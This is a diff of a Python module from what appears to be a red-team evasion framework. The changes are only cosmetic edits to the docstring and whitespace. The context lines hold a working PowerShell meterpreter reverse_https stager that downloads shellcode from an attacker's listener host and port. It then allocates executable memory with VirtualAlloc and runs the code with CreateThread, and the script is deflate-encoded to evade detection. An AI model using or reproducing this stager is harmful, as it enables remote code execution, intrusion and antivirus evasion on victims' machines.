@@ -1,9 +1,7 @@
 """
+Custom-written pure powershell meterpreter/reverse_https stager
 
-Custom-written pure powershell meterpreter/reverse_https stager.
-
-Module by @harmj0y
-
+Module built by @harmj0y
 """
 
 from Tools.Evasion.evasion_common import evasion_helpers
@@ -68,10 +66,10 @@ function g{ for ($i=0;$i -lt 64;$i++){$h = t;$k = $d | e;  foreach ($l in $k){$s
 $m.Headers.Add("user-agent", "%s");$n = g; [Byte[]] $p = $m.DownloadData("https://%s:%s/%s$n" )
 $o = Add-Type -memberDefinition $q -Name "Win32" -namespace Win32Functions -passthru
 $x=$o::VirtualAlloc(0,$p.Length,0x3000,0x40);[System.Runtime.InteropServices.Marshal]::Copy($p, 0, [IntPtr]($x.ToInt32()), $p.Length)
-$o::CreateThread(0,0,$x,0,0,0) | out-null; Start-Sleep -Second 86400}catch{}""" %((int(self.required_options["STAGERURILENGTH"][0])-1), 
+$o::CreateThread(0,0,$x,0,0,0) | out-null; Start-Sleep -Second 86400}catch{}""" %((int(self.required_options["STAGERURILENGTH"][0])-1),
                                                                               "" if self.required_options["PROXY"][0] == "N" else proxyString,
                                                                               self.required_options["USER_AGENT"][0],
-                                                                              self.required_options["LHOST"][0], 
+                                                                              self.required_options["LHOST"][0],
                                                                               self.required_options["LPORT"][0],
                                                                               "" if self.required_options["LURI"][0] == "/" else "%s/" % self.required_options["LURI"][0])
         encoded = evasion_helpers.deflate(baseString)
